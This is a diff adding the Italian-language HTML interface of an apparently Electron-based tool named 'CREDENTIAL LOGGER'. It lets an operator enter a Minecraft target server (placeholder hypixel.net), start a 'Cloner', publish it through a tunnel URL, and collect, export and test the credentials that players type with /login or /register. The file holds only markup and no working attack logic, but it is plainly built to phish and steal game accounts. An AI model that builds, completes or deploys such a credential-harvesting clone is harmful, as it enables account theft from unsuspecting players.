@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CREDENTIAL LOGGER</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Custom Title Bar -->
+    <div class="title-bar">
+        <div class="title-bar-left">
+            <img src="../assets/Logo.png" alt="Logo" class="title-logo">
+            <span class="title-text">CREDENTIAL LOGGER</span>
+        </div>
+        <div class="title-bar-right">
+            <button class="title-btn minimize-btn" id="minimizeBtn">
+                <i class="fas fa-minus"></i>
+            </button>
+            <button class="title-btn maximize-btn" id="maximizeBtn">
+                <i class="fas fa-square"></i>
+            </button>
+            <button class="title-btn close-btn" id="closeBtn">
+                <i class="fas fa-times"></i>
+            </button>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="app-container">
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="sidebar-section">
+                <h3><i class="fas fa-server"></i> Server Target</h3>
+                <div class="input-group">
+                    <label>Host Server</label>
+                    <input type="text" id="serverHost" placeholder="hypixel.net" value="">
+                </div>
+                <div class="input-group">
+                    <label>Porta</label>
+                    <input type="number" id="serverPort" placeholder="25565" value="25565">
+                </div>
+                <button class="btn-primary" id="scanBtn">
+                    <i class="fas fa-search"></i> Scansiona Server
+                </button>
+                <button class="btn-success" id="startBtn">
+                    <i class="fas fa-play"></i> Avvia Cloner
+                </button>
+                <button class="btn-danger" id="stopBtn" disabled>
+                    <i class="fas fa-stop"></i> Ferma Cloner
+                </button>
+            </div>
+
+            <div class="sidebar-section">
+                <h3><i class="fas fa-info-circle"></i> Info Server</h3>
+                <div class="server-info" id="serverInfo">
+                    <div class="info-item">
+                        <span class="info-label">Stato:</span>
+                        <span class="info-value" id="serverStatus">Non connesso</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">Versione:</span>
+                        <span class="info-value" id="serverVersion">-</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">Giocatori:</span>
+                        <span class="info-value" id="serverPlayers">-</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">Tunnel:</span>
+                        <span class="info-value" id="tunnelStatus">Inattivo</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="sidebar-section">
+                <h3><i class="fas fa-link"></i> URL Pubblico</h3>
+                <div class="url-container" id="publicUrlContainer">
+                    <input type="text" id="publicUrl" readonly placeholder="Nessun tunnel attivo">
+                    <button class="btn-copy" id="copyUrlBtn" title="Copia URL">
+                        <i class="fas fa-copy"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Main Content Area -->
+        <div class="main-content">
+            <!-- Navigation Tabs -->
+            <div class="tabs">
+                <button class="tab active" data-tab="console">
+                    <i class="fas fa-terminal"></i> Console
+                </button>
+                <button class="tab" data-tab="credentials">
+                    <i class="fas fa-key"></i> Credenziali
+                </button>
+                <button class="tab" data-tab="stats">
+                    <i class="fas fa-chart-bar"></i> Statistiche
+                </button>
+            </div>
+
+            <!-- Console Tab -->
+            <div class="tab-content active" id="consoleTab">
+                <div class="console-header">
+                    <h2><i class="fas fa-terminal"></i> Output Console</h2>
+                    <button class="btn-secondary" id="clearConsoleBtn">
+                        <i class="fas fa-trash"></i> Pulisci
+                    </button>
+                </div>
+                <div class="console" id="console">
+                    <div class="console-line welcome">
+                        <span class="timestamp">[SISTEMA]</span>
+                        <span class="message">🎯 CREDENTIAL LOGGER pronto all'uso</span>
+                    </div>
+                    <div class="console-line welcome">
+                        <span class="timestamp">[INFO]</span>
+                        <span class="message">Inserisci un server target e clicca "Avvia Cloner"</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Credentials Tab -->
+            <div class="tab-content" id="credentialsTab">
+                <div class="credentials-header">
+                    <h2><i class="fas fa-key"></i> Credenziali Catturate</h2>
+                    <div class="credentials-actions">
+                        <button class="btn-warning" id="clearCredsBtn">
+                            <i class="fas fa-trash"></i> Cancella Tutto
+                        </button>
+                        <button class="btn-success" id="exportCredsBtn">
+                            <i class="fas fa-download"></i> Esporta
+                        </button>
+                        <button class="btn-secondary" id="refreshCredsBtn">
+                            <i class="fas fa-refresh"></i> Aggiorna
+                        </button>
+                        <button class="btn-warning" id="testCredsBtn">
+                            <i class="fas fa-vial"></i> Test
+                        </button>
+                    </div>
+                </div>
+                <div class="credentials-container" id="credentialsContainer">
+                    <div class="no-data">
+                        <i class="fas fa-key"></i>
+                        <p>Nessuna credenziale catturata</p>
+                        <small>Le credenziali appariranno qui quando i giocatori useranno /login o /register</small>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Stats Tab -->
+            <div class="tab-content" id="statsTab">
+                <div class="stats-header">
+                    <h2><i class="fas fa-chart-bar"></i> Statistiche</h2>
+                </div>
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-icon">
+                            <i class="fas fa-users"></i>
+                        </div>
+                        <div class="stat-info">
+                            <div class="stat-value" id="totalConnections">0</div>
+                            <div class="stat-label">Connessioni Totali</div>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon">
+                            <i class="fas fa-key"></i>
+                        </div>
+                        <div class="stat-info">
+                            <div class="stat-value" id="totalCredentials">0</div>
+                            <div class="stat-label">Credenziali Catturate</div>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon">
+                            <i class="fas fa-user-check"></i>
+                        </div>
+                        <div class="stat-info">
+                            <div class="stat-value" id="uniqueUsers">0</div>
+                            <div class="stat-label">Utenti Unici</div>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon">
+                            <i class="fas fa-clock"></i>
+                        </div>
+                        <div class="stat-info">
+                            <div class="stat-value" id="uptime">00:00:00</div>
+                            <div class="stat-label">Tempo Attività</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Status Bar -->
+    <div class="status-bar">
+        <div class="status-left">
+            <span class="status-indicator" id="statusIndicator">●</span>
+            <span id="statusText">Pronto</span>
+        </div>
+        <div class="status-right">
+            <span id="timeDisplay"></span>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner">
+            <i class="fas fa-spinner fa-spin"></i>
+            <p id="loadingText">Caricamento...</p>
+        </div>
+    </div>
+
+    <script src="renderer.js"></script>
+</body>
+</html>
